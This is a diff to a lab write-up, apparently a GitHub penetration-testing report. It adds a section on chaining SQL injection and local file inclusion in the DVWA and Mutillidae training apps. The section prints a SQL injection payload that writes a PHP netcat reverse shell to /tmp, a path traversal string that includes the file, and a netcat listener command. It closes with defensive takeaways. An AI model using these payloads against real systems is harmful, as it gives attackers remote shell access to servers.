@@ -1899,8 +1899,6 @@ example example
 <img width="1440" height="387" alt="Screenshot 2026-06-23 at 4 34 22 PM" src="https://github.com/user-attachments/assets/a3333278-5533-4caa-a150-b463dafc7de6" />
 
 
----
-
  Result
 
 We successfully:
@@ -1908,4 +1906,91 @@ We successfully:
  Read operating system files using `LOAD_FILE()`
  Created a file on the server using `INTO OUTFILE`
 
-This demonstrates that SQL Injection can sometimes provide capabilities similar to File Disclosure and File Upload vulnerabilities, depending on the permissions assigned to the database account.
+
+
+________________________________________
+
+
+ Combining SQL Injection and Local File Inclusion (LFI)
+
+In this exercise, we explored how multiple vulnerabilities can be chained together to increase their overall impact. While each vulnerability may appear limited when exploited independently, combining them can lead to significantly more severe consequences.
+
+ Step 1: Writing a File Through SQL Injection
+
+We first used the vulnerable SQL Injection functionality in DVWA to determine whether data could be written to the server. Although direct file creation within the web root directory (`/var/www`) was not permitted, the database server had sufficient permissions to create files within the temporary directory (`/tmp`).
+
+The following payload was used through the SQL Injection page:
+
+```sql
+' union select '<?passthru("nc -e /bin/sh 172.16.219.133 8080");?>',null into outfile '/tmp/reverse.php'
+```
+
+To perform this test:
+
+1. Log in to DVWA.
+2. Navigate to the SQL Injection module.
+3. Use `-1` as the ID value.
+4. Append the payload shown above.
+
+After execution, the application confirmed that the file had been successfully written to the server and stored in the temporary directory. At this stage, we knew the file existed on the system, but we could not execute it directly because writing to `/var/www` was not allowed.
+
+<img width="1440" height="350" alt="Screenshot 2026-06-23 at 5 04 44 PM" src="https://github.com/user-attachments/assets/5936247a-751c-470a-9479-b639a63bff49" />
+
+
+ Step 2: Identifying a Local File Inclusion (LFI) Vulnerability
+
+Next, we identified a Local File Inclusion (LFI) vulnerability on the same server. The vulnerability allowed files to be requested from locations outside the application's normal web directories.
+
+
+Since the file had already been written to `/tmp`, we used the following path traversal sequence to access it:
+
+```text
+../../../../../tmp/reverse.php
+```
+
+By accessing the file through the LFI vulnerability, we demonstrated how a file created through SQL Injection could be reached and executed even when direct access from the web root was not possible.
+
+<img width="1326" height="734" alt="Screenshot 2026-06-23 at 5 07 26 PM" src="https://github.com/user-attachments/assets/4ee0fc91-9e7e-4dfd-a986-bd1b432ee60b" />
+
+<img width="1204" height="419" alt="Screenshot 2026-06-23 at 5 15 22 PM" src="https://github.com/user-attachments/assets/caf6bc85-bccd-4d24-98b1-faef1cdc6130" />
+
+
+ Step 3: Accessing the File Through Mutillidae
+
+After completing the SQL Injection portion in DVWA, we logged in to Mutillidae and navigated to:
+
+```text
+OWASP Top 10 → Security Misconfiguration → Direct Browsing
+```
+
+Using the same file inclusion technique, we supplied:
+
+```text
+../../../../../tmp/reverse.php
+```
+
+At the same time, a Netcat listener was running:
+
+```bash
+nc -lnvp 8080
+```
+
+Once the file was accessed through the vulnerable page, a connection was received on the listener, demonstrating remote access through the chained vulnerabilities.
+
+<img width="1440" height="807" alt="Screenshot 2026-06-23 at 5 17 07 PM" src="https://github.com/user-attachments/assets/e1a76649-f935-492e-a9de-0bb80d14c832" />
+
+
+<img width="1440" height="536" alt="Screenshot 2026-06-23 at 5 17 28 PM" src="https://github.com/user-attachments/assets/63256784-6ccb-4837-a656-a0a88d32d21c" />
+
+ Key Takeaways
+
+ Individual vulnerabilities may appear limited on their own.
+ Attackers often combine multiple weaknesses to achieve a greater impact.
+ SQL Injection can sometimes allow file creation, depending on database permissions.
+ Local File Inclusion can allow access to files stored outside the web root.
+ Proper file permissions, secure coding practices, and vulnerability remediation are essential to prevent attack chains.
+
+This exercise highlights the importance of addressing all vulnerabilities, even those that may appear low risk when evaluated individually. When combined, seemingly minor weaknesses can create a significantly more serious security exposure.
+
+This version is suitable for a GitHub project report, lab write-up, or penetration testing documentation.
+
